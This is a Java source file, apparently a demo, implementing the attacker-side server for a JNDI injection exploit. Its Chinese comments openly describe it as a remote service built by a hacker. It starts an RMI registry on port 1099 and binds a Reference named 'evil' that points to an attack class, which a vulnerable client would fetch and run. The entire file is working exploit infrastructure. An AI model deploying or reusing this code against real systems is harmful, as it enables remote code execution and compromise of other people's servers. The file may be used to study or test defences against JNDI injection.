package rmiService;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * 攻击端服务
 * 黑客自己创建的远程服务
 */
public class RmiService {
    public static void main(String[] args) {
        try {
            //启动一个jndi服务
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            System.out.println("开启jndi远程服务");
            //创建一个资源
            Reference reference = new Reference("rmiService.Attack","rmiService.Attack",null);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            //给资源命名并绑定
            registry.bind("evil",referenceWrapper);
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
